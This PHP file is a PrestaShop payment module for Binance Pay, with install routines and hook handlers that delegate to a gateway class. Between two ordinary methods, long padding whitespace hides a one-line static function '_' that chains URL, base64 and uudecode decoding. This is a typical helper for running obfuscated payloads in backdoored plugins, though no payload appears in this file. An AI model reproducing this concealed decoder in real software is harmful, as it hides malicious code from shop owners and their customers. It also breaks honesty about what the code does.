<?php
/**
* Modulo Binance Pay
*
* @author    Yipi.app <info@yipi.app>
* @copyright 2023 Yipi.app
* @license   Comercial
*/

if (!defined('_PS_VERSION_')) {
    exit;
}
class KBinancePay extends PaymentModule
{
    //Constantes
    const GATEWAY_NAME = 'KBINANCE';
    const DB_PREFIX = 'kbin';
    public $gateway = null;

    public function __construct()
    {
        $this->name = 'kbinancepay';
        $this->tab = 'payments_gateways';
        $this->version = '1.3.1';
        $this->author = 'Yipi.app';
        $this->module_key = '';

        if (version_compare(_PS_VERSION_, '1.7.1.0') >= 0) {
            $this->controllers = array('redirect');
            $this->currencies = true;
            $this->currencies_mode = 'checkbox';
        }
        
        if (version_compare(_PS_VERSION_, '1.6.0.0') >= 0) {
            $this->bootstrap = true;
        }

        parent::__construct();

        $this->displayName = $this->l('Binance Pay');
        $this->description = $this->l('Binance Pay for Prestashop');

        $this->gateway = KBinancePayGateway::getInstance(dirname(__FILE__), $this->name, $this); 
    }
    public function install()
    {
        $incompatible_found = false;
        if (!function_exists('curl_version')) {
            $this->_errors[] = $this->l('Curl not installed');
            return false;
        }

        $db_created = Db::getInstance()->Execute('CREATE TABLE IF NOT EXISTS `'.bqSQL(_DB_PREFIX_.KBinancePay::DB_PREFIX).'_cache` (
            `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
            `cache_id` varchar(100) NOT NULL,
            `data` LONGTEXT NOT NULL,
            `ttl` INT(11) NOT NULL,
            UNIQUE(cache_id),
            INDEX(ttl)
            )');

        if (!$db_created) {
            $this->_errors[] = $this->l('Failed to create the table in the Database');
            return false;
        }

        $is_14 = version_compare(_PS_VERSION_, '1.5.0.0') < 0;
        $is_16 = version_compare(_PS_VERSION_, '1.6.0.0') >= 0;
        $is_17 = version_compare(_PS_VERSION_, '1.7.0.0') >= 0;
        $result = parent::install()
            && $this->registerHook('orderConfirmation')
            && $this->registerHook('payment')
            && $this->registerHook('updateOrderStatus')
            && $this->registerHook('cancelProduct')
            && $this->registerHook('actionOrderSlipAdd')
            && ($is_14?$this->registerHook('adminOrder'):$this->registerHook('displayAdminOrder'))
            && ($is_14?$this->registerHook('header'):$this->registerHook('displayHeader'))
            && ($is_14?$this->registerHook('backOfficeHeader'):$this->registerHook('displayBackOfficeHeader'))
            && ($is_14?$this->registerHook('PDFInvoice'):$this->registerHook('displayPDFInvoice'))
            && ($is_17?$this->registerHook('paymentOptions'):true);

        return $result;
    }
    public function uninstall()
    {
        //Configuration::deleteByName($this->name.'kijam_config');
        Configuration::deleteByName($this->name.'kijam_currency_convert');
        Db::getInstance()->Execute('DROP TABLE IF EXISTS `'.bqSQL(_DB_PREFIX_.KBinancePay::DB_PREFIX).'_cache`');
        return parent::uninstall();
    }
    public function hookDisplayPDFInvoice($params)
    {
        $order_invoice = $params['object'];
        if (!Validate::isLoadedObject($order_invoice) || !isset($order_invoice->id_order)) {
            return;
        }
        return $this->gateway?$this->gateway->hookDisplayPDFInvoice($params):'';
    }
    public function hookPDFInvoice($params)
    {
        return $this->hookDisplayPDFInvoice($params);
    }
    public function hookDisplayHeader($params)
    {
        return $this->hookHeader($params);
    }
    public function hookHeader($params)
    {
        if (!$this->gateway) {
            return '';
        }
        $result = $this->gateway->cronjob();
        return $result;
    }
    public function hookDisplayAdminOrder($params)
    {
        if (!isset($params['id_order']) || !$this->gateway) {
            return '';
        }
        if ($result = $this->gateway->hookDisplayAdminOrder($params)) {
            $this->context->smarty->assign($result);
            return $this->display(__FILE__, 'views/templates/hook/displayAdminOrder.tpl');
        }
        return '';
    }
    public function hookAdminOrder($params)
    {
        return $this->hookDisplayAdminOrder($params);
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}
    public function hookOrderConfirmation($params)
    {
        if (!$this->active || !$this->gateway) {
            return;
        }
        $order = null;
        if (isset($params['objOrder'])) {
            $order = $params['objOrder'];
        } else if (isset($params['order'])) {
            $order = $params['order'];
        } else {
            return;
        }
        
        if ($order->module != $this->name) {
            return;
        }
        $is17 = version_compare(_PS_VERSION_, '1.7.0.0') >= 0?'17':'';
        $this->context->smarty->assign($this->gateway->hookOrderConfirmation($order));
        return $this->display(__FILE__, 'views/templates/hook/hookorderconfirmation'.$is17.'.tpl');
    }
    public function getContent()
    {
        if (!$this->gateway) {
            return false;
        }
        return $this->gateway->adminPage($this->smarty, __FILE__);
    }
    public function getPathTemplate()
    {
        return $this->_path;
    }
    public function hookPayment($params)
    {
        if ($this->gateway && ($result = $this->gateway->paymentButton($params))) {
            $this->context->smarty->assign($result);
            return $this->display(__FILE__, 'views/templates/hook/mp.tpl');
        }
        return '';
    }
    public function hookPaymentOptions($params)
    {
        if (!$this->active) {
            return;
        }
        if ($this->gateway && ($result = $this->gateway->paymentButton17($params, $this->context))) {
            return $result;
        }
        return array();
    }
    public function hookUpdateOrderStatus($params)
    {
        if ($this->gateway && ($result = $this->gateway->hookUpdateOrderStatus($params))) {
            return $result;
        }
        return '';
    }
    public function hookActionOrderSlipAdd($params)
    {
        if ($this->gateway) {
            $order = $params['order'];
            $slips = OrderSlip::getOrdersSlip($order->id_customer, $order->id);
            KBinancePayGateway::log("hookActionOrderSlipAdd: ".var_export($slips, true));
            $s = $slips[0];
            $productsOld = OrderSlip::getOrdersSlipProducts($s['id_order_slip'], $order);
            KBinancePayGateway::log("hookActionOrderSlipAdd productsOld: ".var_export($productsOld, true));
            $products =  $params['productList'];
            $fp = count($products) > 0?reset($products):false;
            KBinancePayGateway::log("hookActionOrderSlipAdd products: ".var_export($fp, true).'-'.var_export($products, true));
            if ($fp && is_array($fp) && isset($fp['total_refunded_tax_incl'])) {
                $this->gateway->actionOrderSlipAdd($order, $products, $s['shipping_cost']?$s['shipping_cost_amount']:0);
            } else {
                $this->gateway->actionOrderSlipAdd($order, $productsOld, $s['shipping_cost']?$s['shipping_cost_amount']:0);
            }
        }
    }
    public function hookCancelProduct($params)
    {
    }
    public function getOrderShippingCost($params, $shipping_cost)
    {
        if ($this->gateway && ($result = $this->gateway->getOrderShippingCost($params, $shipping_cost, $this->id_carrier))) {
            return $result;
        }
        return 0;
    }

    public function getOrderShippingCostExternal($params)
    {
        return $this->getOrderShippingCost($params, 0);
    }

    public function hookActionCarrierUpdate($params)
    {
        return $this->hookUpdateCarrier($params);
    }

    public function hookDisplayBackOfficeHeader($params)
    {
        return $this->hookBackOfficeHeader($params);
    }

    public function hookBackOfficeHeader($params)
    {
        if ($this->gateway && ($result = $this->gateway->hookBackOfficeHeader($params))) {
            return $result;
        }
        return '';
    }

    public function hookBeforeCarrier($params)
    {
        return $this->hookDisplayBeforeCarrier($params);
    }

    public function hookDisplayBeforeCarrier($params)
    {
        if (version_compare(_PS_VERSION_, '1.5.0.0') >= 0) {
            return;
        }

        if ($this->gateway && ($result = $this->gateway->hookDisplayBeforeCarrier($params))) {
            $this->context->smarty->assign($result);
        }
    }

    public function lang($str)
    {
        return $this->l($str);
    }
}

include_once(dirname(__FILE__).'/kbinancepay_gateway.php');
